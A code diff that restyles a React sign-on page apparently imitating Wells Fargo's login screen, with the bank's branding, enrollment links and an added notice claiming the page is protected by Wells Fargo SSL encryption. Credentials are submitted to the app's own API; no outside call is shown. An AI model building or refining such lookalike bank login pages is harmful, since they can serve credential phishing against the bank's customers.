@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState } from "react";
 import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
@@ -15,7 +15,7 @@ import {
 } from "@/components/ui/form";
 import { useToast } from "@/hooks/use-toast";
 import { apiRequest } from "@/lib/queryClient";
-import { Key, ArrowRight, Menu } from "lucide-react";
+import { Key, ArrowRight, Menu, User } from "lucide-react";
 import { Link, useLocation } from "wouter";
 import { OfficialFooter } from "@/components/official-footer";
 
@@ -141,6 +141,8 @@ export default function LoginPage() {
     loginMutation.mutate(data);
   };
 
+  const hasCredentials = form.watch("username") && form.watch("password");
+
   return (
     <div className="min-h-screen flex flex-col bg-white">
       {/* Header */}
@@ -184,6 +186,10 @@ export default function LoginPage() {
                   <FormControl>
                     <Input
                       placeholder="Username"
+                      autoComplete="username"
+                      autoCapitalize="off"
+                      autoCorrect="off"
+                      spellCheck={false}
                       className="h-14 px-4 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                       data-testid="input-username"
                       {...field}
@@ -205,6 +211,7 @@ export default function LoginPage() {
                       <Input
                         type={showPassword ? "text" : "password"}
                         placeholder="Password"
+                        autoComplete="current-password"
                         className="h-14 px-4 pr-16 text-lg border-2 border-gray-300 rounded-lg focus:border-[#d71e28] focus:ring-0 bg-white placeholder:text-gray-400"
                         data-testid="input-password"
                         {...field}
@@ -212,7 +219,7 @@ export default function LoginPage() {
                       <button
                         type="button"
                         onClick={() => setShowPassword(!showPassword)}
-                        className="absolute right-4 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium underline"
+                        className="absolute right-4 top-1/2 -translate-y-1/2 text-[#d71e28] font-medium underline text-sm"
                         data-testid="button-toggle-password"
                       >
                         {showPassword ? "Hide" : "Show"}
@@ -256,20 +263,20 @@ export default function LoginPage() {
             <div className="pt-4">
               <Button
                 type="submit"
-                className="w-full h-14 bg-gray-200 hover:bg-gray-300 text-gray-500 font-semibold rounded-full text-lg transition-all disabled:opacity-100"
-                disabled={loginMutation.isPending || !form.watch("username") || !form.watch("password")}
+                className={`w-full h-14 font-semibold rounded-full text-lg transition-all ${
+                  hasCredentials 
+                    ? "bg-[#ffcd41] hover:bg-[#e6b938] text-[#1a1a1a]" 
+                    : "bg-[#e5e5e5] text-gray-400 cursor-not-allowed"
+                }`}
+                disabled={loginMutation.isPending || !hasCredentials}
                 data-testid="button-sign-on"
-                style={{
-                  backgroundColor: form.watch("username") && form.watch("password") ? "#ffcd41" : "#e5e5e5",
-                  color: form.watch("username") && form.watch("password") ? "#1a1a1a" : "#9ca3af",
-                }}
               >
                 {loginMutation.isPending ? "Signing on..." : "Sign on"}
               </Button>
             </div>
 
             {/* Or divider */}
-            <div className="flex items-center justify-center py-2">
+            <div className="flex items-center justify-center py-3">
               <span className="text-gray-500 text-base">or</span>
             </div>
 
@@ -282,7 +289,7 @@ export default function LoginPage() {
               onClick={handleBiometricLogin}
               disabled={biometricLoading}
             >
-              <Key className="w-5 h-5 mr-2" />
+              <User className="w-5 h-5 mr-2" />
               {biometricLoading ? "Authenticating..." : "Use a passkey"}
             </Button>
 
@@ -298,7 +305,7 @@ export default function LoginPage() {
           <ArrowRight className="w-4 h-4 text-[#d71e28]" />
           <Link 
             href="/forgot-password" 
-            className="text-[#6b21a8] font-medium underline"
+            className="text-[#6b21a8] font-medium hover:underline"
             data-testid="link-forgot"
           >
             Forgot username or password?
@@ -311,13 +318,20 @@ export default function LoginPage() {
             <span className="text-base text-gray-700">New to Wells Fargo?</span>
             <Link 
               href="/register" 
-              className="text-[#d71e28] font-bold flex items-center gap-1"
+              className="text-[#d71e28] font-bold flex items-center gap-1 hover:underline"
               data-testid="link-register"
             >
               Enroll Now
               <ArrowRight className="w-4 h-4" />
             </Link>
           </div>
+        </div>
+
+        {/* Security Notice */}
+        <div className="mt-8 pt-6 border-t border-gray-200">
+          <p className="text-xs text-gray-500 leading-relaxed">
+            Your security is important to us. Wells Fargo uses 128-bit Secure Sockets Layer (SSL) encryption to protect your personal information. Never share your password with anyone. Wells Fargo will never ask for your password via email, phone, or text message.
+          </p>
         </div>
       </main>
 
